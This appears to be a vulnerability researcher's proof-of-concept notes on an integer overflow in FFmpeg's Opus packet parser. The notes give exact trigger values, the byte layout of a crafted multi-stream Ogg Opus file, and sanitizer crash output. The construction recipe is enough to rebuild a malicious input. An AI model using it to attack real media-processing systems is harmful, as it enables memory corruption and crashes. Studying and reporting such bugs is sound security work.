# VULN 001 PoC Notes: Integer Overflow in ff_opus_parse_packet()

## Vulnerability

**File**: `libavcodec/opus/parse.c`, lines 223-228 (CBR self-delimiting path)

```c
if (self_delimiting) {
    frame_bytes = xiph_lacing_16bit(&ptr, end);
    if (frame_bytes < 0 || pkt->frame_count * frame_bytes + padding > end - ptr)  // line 225
        goto fail;
    end      = ptr + pkt->frame_count * frame_bytes + padding;
    buf_size = end - buf;
}
```

The expression `pkt->frame_count * frame_bytes + padding` overflows signed int32 when:
- `frame_count = 48` (maximum OPUS_MAX_FRAMES)
- `frame_bytes = 1275` (maximum OPUS_MAX_FRAME_SIZE)
- `padding = 2,147,422,448`

Sum: `48 × 1275 + 2,147,422,448 = 2,147,483,648 = INT_MAX+1 → wraps to INT_MIN = -2,147,483,648`

The bounds check then evaluates `-2,147,483,648 > (end - ptr)` = `False`, bypassing the guard. `end` is set ~2 GB before `ptr`, and `buf_size` / `pkt->packet_size` become a large negative value (~-2,139,029,224).

**Cascade in dec.c:590-591**:
```c
buf      += s->packet.packet_size;   // buf advances backward by ~2 GB
buf_size -= s->packet.packet_size;   // buf_size overflows to negative
```

The next `ff_opus_parse_packet` call for stream 1 receives a pointer 2 GB before the original buffer.

## Trigger Conditions

1. **Multi-stream Ogg Opus** (channel_mapping_family=1, stream_count=2) causes `self_delimiting=1` for stream 0 in `dec.c:501`.
2. **code=3, CBR (VBR=0), padding flag set** in the stream 0 Opus packet.
3. **Padding lacing encodes 2,147,422,448** via Xiph lacing (~8.1 MB of 0xFF bytes).
4. **frame_bytes = 1275** encoded as `[0xFF, 0xFF]` via `xiph_lacing_16bit`.
5. **Config=16** (CELT NB 2.5ms, frame_duration=120 samples): 48 frames × 120 = 5760 = OPUS_MAX_PACKET_DUR, which passes the duration check (strict >, not >=).

## PoC Construction

### Ogg File Structure
- One logical bitstream (serial 0x12345678)
- **OpusHead** (BOS page): family=1, stream_count=2, coupled_count=0, channels=2, channel_mapping=[0,1]
- **OpusTags** page: minimal vendor string
- **Audio pages** (131 pages): carry the ~8.1 MB crafted Opus packet

### Opus Packet Bytes
```
[0x83]          TOC: config=16, stereo=0, code=3
[0x70]          count: VBR=0, padding=1, frame_count=48
[0xFF × 8454419]  padding Xiph lacing (each net +254)
[0x16]          padding lacing remainder (22 → total = 8454419×254+22 = 2,147,422,448)
[0xFF 0xFF]     frame_bytes = 1275 via xiph_lacing_16bit
[0x00 × 61200]  frame data: 48 × 1275 bytes of zeros
```

### Xiph Full Lacing Encoding of N
Each 0xFF byte contributes net +254 (= val += 255, val--).
Final byte f (0–253) contributes f directly.
Encoding: `n = N // 254` bytes of 0xFF, then 1 byte of `N % 254`.

## Confirmed Sanitizer Output

The binary is compiled with `-fsanitize=address,undefined`. Running the PoC produces:

```
src/libavcodec/opus/parse.c:225:71: runtime error:
  signed integer overflow: 2147422448 + 61200 cannot be represented in type 'int'
src/libavcodec/opus/parse.c:247:41: runtime error:
  signed integer overflow: -2139029224 - 2147422448 cannot be represented in type 'int'
src/libavcodec/opus/dec.c:591:18: runtime error:
  signed integer overflow: 8515624 - -2139029224 cannot be represented in type 'int'
```

All three UBSan reports correspond exactly to the vulnerability cascade:
1. The root overflow at parse.c:225 (the vulnerability itself)
2. Cascade to `pkt->data_size` at parse.c:247
3. Cascade to `buf_size` at dec.c:591 (corrupted pointer advancement)

## Files

| File | Description |
|------|-------------|
| `vuln_001_gen.py` | Python generator for `vuln_001_input.ogg` (~8.2 MB crafted file) |
| `vuln_001_input.ogg` | The crafted multi-stream Ogg Opus file |
| `vuln_001_run.sh` | Shell script to generate input and run FFmpeg |
| `vuln_001_result.txt` | FFmpeg output including UBSan reports |
| `vuln_001_status.txt` | `VERIFIED_CRASH` |
